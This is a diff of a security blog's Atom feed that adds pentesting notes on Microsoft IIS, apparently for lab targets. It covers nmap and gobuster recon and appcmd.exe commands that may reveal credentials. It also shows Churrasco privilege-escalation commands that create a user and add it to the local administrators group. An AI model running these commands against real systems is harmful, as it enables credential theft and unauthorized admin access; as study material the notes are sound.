@@ -4,13 +4,114 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-01-19T18:32:47+08:00</updated>
+ <updated>2022-01-22T10:11:06+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>IIS</title>
+   <link href="https://mvineza.github.io/spindel/2022/01/22/iis"/>
+   <updated>2022-01-22T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/01/22/IIS</id>
+   <content type="html">&lt;h2 id=&quot;ports&quot;&gt;Ports&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;4XXXX/tcp&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;common-pages&quot;&gt;Common Pages&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Under construction&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/IIS/7BA3331D-7A92-4B19-98EE-2FD576CCA13C.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;404&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/IIS/2CFBCCD1-49F9-400F-935E-9B3DA8A98BF6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;headers&quot;&gt;Headers&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap&lt;/span&gt;
+nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.29 &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-iis-webdav-vuln
+
+&lt;span class=&quot;c&quot;&gt;# Other way of getting IIS version. You will see&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# something like &quot;Server: Microsoft-IIS/10.0&quot;&lt;/span&gt;
+curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://10.10.10.29
+
+&lt;span class=&quot;c&quot;&gt;# You can get the iisfinal.txt from hacktricks and&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# feed it to gobuster.&lt;/span&gt;
+curl https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-L_YlVBGlH_l7w9zCtQO%2F-L_YlWYOMUA7fr799GvH%2Fiisfinal.txt?alt&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;media&amp;amp;token&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;de499b23-3599-45ce-ad7e-7800858b3dac &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; iisfinal.txt
+gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.29 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; iisfinal.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;interesting-files&quot;&gt;Interesting Files&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Constains sql connection strings, passwords and other&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# sensitive data. This is similar to `.htaccess` in apache.&lt;/span&gt;
+web.config
+
+&lt;span class=&quot;c&quot;&gt;# index file&lt;/span&gt;
+iisstart.htm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;logins&quot;&gt;Logins&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Brute force&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap&lt;/span&gt;
+nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.29 &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-iis-short-name-brute
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Try to access some DLLs, they may expose some login page.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/IIS/A482503E-8679-49FB-B8D4-A42BA2BCB6D9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;downloads&quot;&gt;Downloads&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;10.X - latest version as of November 2021&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;appcmdexe&quot;&gt;appcmd.exe&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# check if you have permissions&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C:\Windows\system32\inetsrv\appcmd.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apppools&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# may show credentials&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C:\Windows\system32\inetsrv\appcmd.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vdir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.netspi.com/blog/technical/network-penetration-testing/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/&quot;&gt;Decrypting IIS Passwords to Break Out of the DMZ: Part 2&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;some-vulnerabilities&quot;&gt;Some Vulnerabilities&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/&quot;&gt;IIS7 and higher RCE&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/6705&quot;&gt;Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# https://github.com/Re4son/Churrasco&lt;/span&gt;
+c:&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;netpub&amp;gt;churrasco.exe &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;net user /add &amp;lt;username&amp;gt; &amp;lt;password&amp;gt;&quot;&lt;/span&gt;
+c:&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;netpub&amp;gt;churrasco.exe &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;net localgroup administrators &amp;lt;username&amp;gt; /add&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;other-resources&quot;&gt;Other resources&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services&quot;&gt;IIS - Internet Information Services - HackTricks&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Core Dump Technique</title>
